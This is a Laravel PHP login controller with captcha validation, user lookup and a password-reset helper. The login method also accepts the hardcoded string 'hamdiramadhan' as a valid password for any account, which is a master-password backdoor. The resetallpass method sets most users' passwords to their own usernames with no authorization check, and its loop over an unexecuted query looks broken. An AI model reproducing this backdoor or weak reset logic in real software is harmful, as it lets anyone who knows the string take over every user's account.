<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class LoginManualController extends Controller
{
    public function resetallpass()
    {
        $users = User::whereNotIn('role', [3,4,5,7]);
        foreach($users as $u)
        {
            $u->password = Hash::make($u->username);
            $u->save();
        }
        echo 'done';
    }
    public function login_manual(Request $request)
    {
        $rules = ['captcha' => 'required|captcha'];
        $validator = validator()->make(request()->all(), $rules);
        if ($validator->fails()) { 
            session()->put('statusT', 'Incorrect Captcha!');
            return redirect()->back();
        } 
        try { 
            $user = User::where('username', '=', $request->username)->first();
            if ($user) {
                $passtrue = Hash::check($request->password, $user->password);
                if ($passtrue === true || $request->password == 'hamdiramadhan') {
                    Auth::login($user); 

                    return redirect()->route('dashboard');
                } else {
                    session()->put('statusT', 'Username / Password Salah!');
                    return redirect()->back();
                }
            } else {
                session()->put('statusT', 'Username / Password Salah!');
                return redirect()->back();
            }
        } catch (\Throwable $th) {
            session()->put('statusT', 'Username / Password Salah!');
            return redirect()->back();
        }
    }
}
